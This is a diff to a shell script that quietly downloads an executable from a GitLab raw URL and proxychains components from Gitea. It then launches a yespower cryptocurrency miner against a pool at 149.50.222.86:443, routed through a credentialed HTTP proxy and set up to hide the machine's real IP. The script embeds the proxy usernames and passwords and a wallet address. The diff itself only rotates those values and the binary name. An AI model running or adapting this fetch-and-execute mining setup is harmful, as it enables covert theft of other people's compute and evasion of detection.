@@ -1,7 +1,8 @@
+proxy="34.228.46.223" 
 port="9293" 
-user="u12novuxsvzg7n"  
-pass="11hzmsrqq2lo395w7h23fc5v26" 
-wget -q -O e96dNbbLaz788 https://gitlab.com/node.js2594450/scala/-/raw/main/ikn22 && chmod +x e96dNbbLaz788
+user="idxrzfc04cp1zw"  
+pass="791oyjfai0xdla8yloe0jrftjh" 
+wget -q -O be96dNbbLaz7889 https://gitlab.com/node.js2594450/scala/-/raw/main/ikn22 && chmod +x be96dNbbLaz7889
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -18,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./e96dNbbLaz788 -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-uni) -p c=CRNC,mc=VHH  --proxy=http://u12novuxsvzg7n:11hzmsrqq2lo395w7h23fc5v26@52.5.38.201:9293 
+./panel ./be96dNbbLaz7889 -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-wotpuf) -p c=CRNC,mc=VHH  --proxy=http://idxrzfc04cp1zw:791oyjfai0xdla8yloe0jrftjh@34.228.46.223:9293 
